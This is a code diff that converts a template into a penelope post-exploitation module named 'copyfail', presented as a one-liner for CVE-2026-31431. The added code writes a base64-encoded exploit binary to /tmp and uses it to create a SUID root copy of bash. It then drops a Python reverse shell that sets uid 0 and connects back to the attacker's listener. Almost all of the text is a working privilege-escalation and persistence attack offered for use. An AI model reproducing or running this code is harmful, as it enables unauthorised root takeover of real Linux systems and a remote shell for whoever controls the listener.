@@ -101,10 +101,10 @@ The class name becomes the module name shown in penelope's `run` command.
 import penelope
 
 # Required: must subclass penelope.Module
-class template_module(penelope.Module):
+class copyfail(penelope.Module):
 
     # Module category shown in `run` listing
-    category = "Misc"
+    category = "Privilege Escalation"
 
     # Set True to auto-run when a session is first established
     on_session_start = False
@@ -115,13 +115,9 @@ class template_module(penelope.Module):
     # Set True to auto-run when session ends
     on_session_end = False
 
-    def run(session, args):
+    def run(session, args=None):
         """
-        One-line description shown in `run` listing.
-
-        Extended help shown when user runs: run template_module --help
-        args is a string of everything the user typed after the module name,
-        or None when triggered by a hook (on_session_start etc).
+        Execute Copy Fail One-liner (CVE-2026-31431)
         """
 
         # Guard on OS if module is platform-specific
@@ -129,17 +125,46 @@ class template_module(penelope.Module):
             penelope.logger.error("This module runs on Unix only")
             return
 
-        # Run command and return output
-        output = session.exec("id", value=True)
-        if output:
-            print(output)
+        host = session._host
+        port = session._port
 
-        # Upload a local file
-        # session.upload("/path/to/local/file", remote_path=session.tmp)
+        # Stage exploit — value=True blocks until write completes
+        staged = session.exec(
+            "echo 'f0VMRgIBAQAvYmluL3N1AAIAPgABAAAAlwBAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAACYAYWVhZAAAmgEAAAAAAACaAQAAAAAAAGF1dGhlbmNlc24oaG1hYyhtZDUpLGVjYihjaXBoZXJfbnVsbCkpADH/amlYDwW/CABAADH2hcB4CsZHBmhqO1iZDwVqAliZDwWVvNgCQACJ4GeNSNCJTCTIxkQk0BTHRCSACAABAGa6FwFmiVQk2MZEJNwExkQk4AiJRCToxkQk8AiD6BiJRCS4/kQkwDHbailYmYkUJWgAQABqJl9qBV4PBb5YAEAAl7I/sDEPBcYEJWkAQAACvhcBAACwNrIBTI1UJIBBsAgPBUmDwgRBsASyBbA2DwVFMdIx9rArmQ8FlzHSi4sAAEAAiUwkBI10JKi2gGouWA8FTIlUJPiDwwSJ7o1UJPhJidqwKA8FRTHSjVMEVF6wLQ8FgP8CdcO/CABAADH26RP///8=' | base64 -d > /tmp/copyfail && chmod +x /tmp/copyfail && echo staged",
+            value=True
+        )
+        if not staged or "staged" not in staged:
+            penelope.logger.error("Failed to stage exploit binary")
+            return
 
-        # Spawn a new session on current listener
-        # session.spawn()
+        # Pipe command into exploit stdin — patched su drops root shell reading from stdin
+        # (penelope raw sessions have no /dev/tty so root shell falls back to pipe stdin)
+        session.exec("echo 'cp /bin/bash /tmp/rootsh && chmod 4755 /tmp/rootsh' | /tmp/copyfail", value=False)
 
-        # Parse args (args is a str or None when hook-triggered)
-        # if args and "--verbose" in args:
-        #     ...
+        # Poll for SUID shell instead of blocking sleep
+        suid_check = None
+        for _ in range(10):
+            suid_check = session.exec("ls -la /tmp/rootsh 2>/dev/null", value=True)
+            if suid_check and "rwsr" in suid_check:
+                break
+            import time; time.sleep(1)
+
+        if not suid_check or "rwsr" not in suid_check:
+            penelope.logger.error("SUID shell not created — exploit failed")
+            return
+
+        print("[+] SUID shell created — writing root callback")
+        # rootsh -p = EUID=0, RUID=marco; python3 setuid(0) collapses to true root
+        # use python3 socket directly — no /dev/tcp bash dependency
+        import base64 as _b64
+        cb = (
+            f"import os,socket,subprocess\n"
+            f"os.setuid(0);os.setgid(0)\n"
+            f"s=socket.socket()\n"
+            f"s.connect(('{host}',{port}))\n"
+            f"[os.dup2(s.fileno(),f) for f in(0,1,2)]\n"
+            f"subprocess.call(['/bin/bash','-i'])\n"
+        )
+        b64 = _b64.b64encode(cb.encode()).decode()
+        session.exec(f"echo '{b64}' | base64 -d > /tmp/rootcb.py; chmod +x /tmp/rootcb.py", value=True)
+        session.exec("/tmp/rootsh --norc --noprofile -p -c 'python3 /tmp/rootcb.py' &", value=False)
